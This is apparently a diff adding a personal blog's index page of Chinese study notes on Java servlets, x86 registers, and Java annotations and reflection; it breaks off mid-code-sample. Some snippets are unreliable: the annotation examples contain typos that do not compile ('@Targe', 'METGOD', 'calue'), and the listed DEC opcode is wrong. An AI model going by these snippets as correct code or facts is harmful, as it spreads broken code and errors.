class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        ServletContext context &#x3D; this.getServletContext();</span><br><span class="line">        String username &#x3D; (String) context.getAttribute(&quot;username&quot;);</span><br><span class="line">        resp.getWriter().print(&quot;名字&quot;+username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>web.xml:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.kuang.servlet.HelloServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">&lt;&#x2F;servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;hello&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;&#x2F;hello&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;&#x2F;servlet-mapping&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;getc&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;com.kuang.servlet.GetServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;getc&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;getc&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(2)配置和调用初始化参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.servlet;</span><br><span class="line"></span><br><span class="line">import jakarta.servlet.ServletContext;</span><br><span class="line">import jakarta.servlet.ServletException;</span><br><span class="line">import jakarta.servlet.http.HttpServlet;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">import jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ServletDemo03 extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        ServletContext context &#x3D; this.getServletContext();</span><br><span class="line">        String url&#x3D;context.getInitParameter(&quot;url&quot;);&#x2F;&#x2F;获取参数</span><br><span class="line">        resp.getWriter().print(url);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>web.xml:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--配置一些web应用初始化参数--&gt;</span><br><span class="line">&lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;url&lt;&#x2F;param-name&gt;</span><br><span class="line">    &lt;param-value&gt;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;mybatis&lt;&#x2F;param-value&gt;</span><br><span class="line">&lt;&#x2F;context-param&gt;</span><br><span class="line"></span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;gp&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.kuang.servlet.ServletDemo03&lt;&#x2F;servlet-class&gt;</span><br><span class="line">&lt;&#x2F;servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;gp&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;&#x2F;gp&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(3)请求转发(和重定向有区别，url路径没有变，返回值是200，不是300）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.servlet;</span><br><span class="line"></span><br><span class="line">import jakarta.servlet.RequestDispatcher;</span><br><span class="line">import jakarta.servlet.ServletContext;</span><br><span class="line">import jakarta.servlet.ServletException;</span><br><span class="line">import jakarta.servlet.http.HttpServlet;</span><br><span class="line">import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">import jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class ServletDemo04 extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        ServletContext context &#x3D; this.getServletContext();</span><br><span class="line">        RequestDispatcher requestDispatcher &#x3D; context.getRequestDispatcher(&quot;&#x2F;gp&quot;);&#x2F;&#x2F;转发的请求路径</span><br><span class="line">        requestDispatcher.forward(req,resp);&#x2F;&#x2F;调用forward方法实现请求转发，合并：context.getRequestDispatcher(&quot;&#x2F;gp&quot;).forward(req,resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;sd4&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.kuang.servlet.ServletDemo04&lt;&#x2F;servlet-class&gt;</span><br><span class="line">&lt;&#x2F;servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;sd4&lt;&#x2F;servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;&#x2F;sd4&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+<p>(4)读取资源文件<br>Properties类<br>在java目录下新建properties<br>在resources目录下新建properties<br>发现：都被打包到了同一个路径下：classes，我们速成这个路径问classpath<br>思路：都需要一个文件流<br>资源文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;root</span><br><span class="line">password&#x3D;123456</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class ServletDemo05 extends HttpServlet &#123;</span><br><span class="line">@Override</span><br><span class="line">protected void doGet(HttpServletRequest req, HttpServletResponse resp)</span><br><span class="line">throws ServletException, IOException &#123;</span><br><span class="line">InputStream is &#x3D; this.getServletContext().getResourceAsStream(&quot;&#x2F;WEB-INF&#x2F;classes&#x2F;com&#x2F;kuang&#x2F;servlet&#x2F;aa.properties&quot;);</span><br><span class="line">Properties prop &#x3D; new Properties();</span><br><span class="line">prop.load(is);</span><br><span class="line">String user &#x3D; prop.getProperty(&quot;username&quot;);</span><br><span class="line">String pwd &#x3D; prop.getProperty(&quot;password&quot;);</span><br><span class="line">resp.getWriter().print(user+&quot;:&quot;+pwd);</span><br><span class="line">&#125;</span><br><span class="line">@Override</span><br><span class="line">protected void doPost(HttpServletRequest req, HttpServletResponse resp)</span><br><span class="line">throws ServletException, IOException &#123;</span><br><span class="line">doGet(req, resp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>6.6 httpServletResponse<br>web服务器接收到客户端的http请求，针对这个请求，分别创建一个代表请求的HTTPServletRequest对象，代表响应的一个HTTPServletResponse</p>
+<p>如果要获取客户端请求过来的参数：找HTTPServletRequest<br>如果要给客户端响应一些信息：找HTTPServletResponse</p>
+<p>1、简单分类<br>负责向浏览器发送数据的方法：<br>getOutputStream()<br>getWriter()</p>
+<p>负责向浏览器发一些响应头的方法：<br>setCharacterEncoding()<br>setContentLength()<br>setContentLengthLong()<br>setContentType()<br>setDateHeader()<br>addDateHeader()<br>setHeader()<br>addHeader()<br>setIntHeader()<br>addIntHeader()<br>setStatus()</p>
+<p>2.常见应用<br>    1.向浏览器输出信息(略)<br>    2.下载文件<br>        获取下载路径<br>        下载的文件名<br>        设置想办法让浏览器能够支持下载我们需要的东西<br>        获取下载的文件输入流<br>        创建缓冲区<br>        获取OutputStream对象<br>        将FileOutputStraem流写入到buffer缓冲区<br>        使用OutputStream将缓冲区中的数据输出到客户端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>3.验证码功能
+前端实现
+后端实现，需要用到Java的图片类，产生一个图片
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>4.重定向（最重要的）
+    url会变
+    常见场景：用户登录
+    方法：sendRedirect
+</code></pre>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>重定向（发两次请求，先向A发请求，获得B的路径，然后向B发请求）<br>转发（发一次请求，向A发请求，A获取B的内容后直接返回给客户端）</p>
+<p>Request应用</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/21/JavaWeb%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-二进制-汇编笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/19/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">二进制/汇编笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/19/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-01-19T08:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>看课程可能是最简单的组成原理知识，可能对pwn帮助不大，权当复习吧</p>
+<p>加 INC -编译器-&gt; 0100 0000<br>减 DEC            0100 0100<br>乘 MUL            0100 1000 0100 1000<br>除 DIV             0100 1000 1100 1000</p>
+<p>想法：运用自己的进制写编译器，来进行从根源加密</p>
+<p>位运算加减乘除</p>
+<p>用或与非异或实现加法<br>1.异或运算（如果不考虑进位，异或可以直接出结果）<br>2.与运算（用于判断进位，若结果为0（即所有数都为0），则没有进位）<br>3.将与运算的结果左移一位<br>4.第三步的结果和第一步的结果异或<br>5.确认结果，将第四步的两个数与运算，判断是否有0（判断是否有进位）<br>（步骤：<br>1.A xor B -&gt; C<br>2.A and B -&gt; D<br>3.if(D==0) print(C)<br>else D&lt;&lt;(D左移一位)<br>4.C xor D -&gt; C<br>5.C and D -&gt; D<br>6.if(D==0) print(C)<br>else D&lt;&lt;(D左移一位)<br>……</p>
+<p>减法（转负数相加后走上面的步骤）</p>
+<p>乘除就是按照组原的补码移位那一套使用加法就好了</p>
+<p>汇编<br>1.最好从vc6开始学各种东西来了解底层<br>2.ollydbg</p>
+<p>通用寄存器：<br>32位的通用寄存器只有8个<br>EAX<br>ECX<br>EDX<br>EBX<br>ESP<br>EBP<br>ESI<br>EDI<br>存值范围0-FFFFFFFF</p>
+<p>16位：FFFF<br>AX<br>CX<br>DX<br>BX<br>SP<br>BP<br>SI<br>DI</p>
+<p>8位：FF<br>AL<br>CL<br>DL<br>BL<br>AH<br>CH<br>DH<br>BH<br>8位：L低八位，H高八位</p>
+<p>指令：<br>MOV：<br>    mov 目的地址，立即数<br>    mov 目的地址，取数地址</p>
+<p>内存：<br>每个应用程序都有4GB的内存空间（可以理解为虚拟机的预设磁盘大小？虽然预设40G，但是虚拟机本身往往都没有40G）</p>
+<p>说是二进制，但是对于内存，寄存器还有汇编的知识都不是很具体（不过比我的组原老师讲的好太多了）</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/19/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-JavaScript笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/">JavaScript笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-01-18T08:43:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>“js开发只用了十天”</p>
+<p>以后有时间补</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/18/JavaScript%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-Java注解与反射" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/18/Java%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/">Java注解与反射</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/18/Java%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84/" class="archive-article-date">
+  	<time datetime="2022-01-18T04:20:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>框架基于注解和反射<br>（反射是框架的基础，但是纯听反射越听越迷，尽量听，实在不行学框架的时候再回来听一遍）</p>
+<p>注解：<br>1.@Override :重写<br>2.@FunctionalInterface :函数式接口<br>3.@Deprecated :废弃，不推荐使用<br>4.@SuppressWarn ：镇压警告（防止报“警告”）</p>
+<p>注解格式：@注释名(参数)</p>
+<p>可以通过反射机制对这些注解进行访问</p>
+<p>内置注解：<br>1.@Override :重写<br>2.@Deprecated :废弃，不推荐使用<br>3.@SuppressWarn ：镇压警告（防止报“警告”）</p>
+<p>元注解：（注解的注解）<br>1.@Target :描述注解的使用范围<br>2.@Retention :表示要在什么级别保存该注释信息，用于描述注解的生命周期（SOURCE&lt;CLASS&lt;RUNTIME）<br>3.@Documented :说明该注解被包含在javadoc中<br>4.@Inherited :说明子类可以继承父类中的该注解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">定义一个注解</span><br><span class="line">&#x2F;&#x2F;Target 表示我们的注解可以用在哪些地方</span><br><span class="line">@Targe(value&#x3D;&#123;ElementType.METGOD,ElementType.TYPE&#125;)</span><br><span class="line">&#x2F;&#x2F;表示我们的注解在什么地方还有效</span><br><span class="line">&#x2F;&#x2F;SOURCE&lt;CLASS&lt;RUNTIME</span><br><span class="line">@Retention(calue&#x3D; REtentionPolicy.RUNTIME)</span><br><span class="line">&#x2F;&#x2F;Documented 说明该注解被生成在javadoc中</span><br><span class="line">@Documented</span><br><span class="line">&#x2F;&#x2F;Inherited 说明子类可以继承父类中的该注解</span><br><span class="line">@Inherited</span><br></pre></td></tr></table></figure>
+
+<p>自定义注解：<br>@interface</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@Targe(value&#x3D;&#123;ElementType.METGOD,ElementType.TYPE&#125;)</span><br><span class="line">@Retention(calue&#x3D; REtentionPolicy.RUNTIME)</span><br><span class="line">@interface MyAnnotation2&#123;</span><br><span class="line">	&#x2F;&#x2F;注解的单数：注解类型 参数名() default 默认值;  （如果不写默认值就需要在注解的时候填上值）</span><br><span class="line">	String name() default &quot;&quot;;</span><br><span class="line">	int age() default 0;</span><br><span class="line">	int id() default -1;&#x2F;&#x2F;如果默认值为-1，代表不存在（返回-1）</span><br><span class="line">	String[] schools() default &#123;&quot;西部&quot;,&quot;大学&quot;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>反射：<br>Reflection<br>（取得类的任何内部信息）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">public class test02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        &#x2F;&#x2F;通过反射获取类的class对象</span><br><span class="line">        Class c1&#x3D;Class.forName(&quot;com.kuang.lesson01.User&quot;);</span><br><span class="line">        System.out.println(c1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;对比类是否相同（打印hashcode）</span><br><span class="line">        System.out.println(c1.hashCode());</span><br><span class="line">        &#x2F;&#x2F;一个类在内存中只有一个class对象</span><br><span class="line">        &#x2F;&#x2F;一个类被加载后，类的整个结构都会被封装在Class对象中</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;实体类</span><br><span class="line">class User&#123;</span><br><span class="line">    private String name ;</span><br><span class="line">    private int id;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public User()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public User(String name, int id, int age)&#123;</span><br><span class="line">        this.name&#x3D;name;</span><br><span class="line">        this.id&#x3D;id;</span><br><span class="line">        this.age&#x3D;age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getId() &#123;</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int id) &#123;</span><br><span class="line">        this.id &#x3D; id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name&#x3D;&#39;&quot; + name + &#39;\&#39;&#39; +</span><br><span class="line">                &quot;, id&#x3D;&quot; + id +</span><br><span class="line">                &quot;, age&#x3D;&quot; + age +</span><br><span class="line">                &#39;&#125;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以用来找类的各种信息（如父类）：虽然不如编辑器好用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.lesson01;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;测试class类的创建方式有哪些</span><br><span class="line">public class test02 &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        Person person &#x3D; new Student();</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;方式一：通过对象获得</span><br><span class="line">        Class c1&#x3D;person.getClass();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;方式二：forname获得</span><br><span class="line">        Class c2&#x3D;Class.forName(&quot;com.kuang.lesson01.Student&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;方法三：通过类名.class获得</span><br><span class="line">        Class c3&#x3D; Student.class;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;验证几个内容是否相同</span><br><span class="line">        System.out.println(c1.hashCode());</span><br><span class="line">        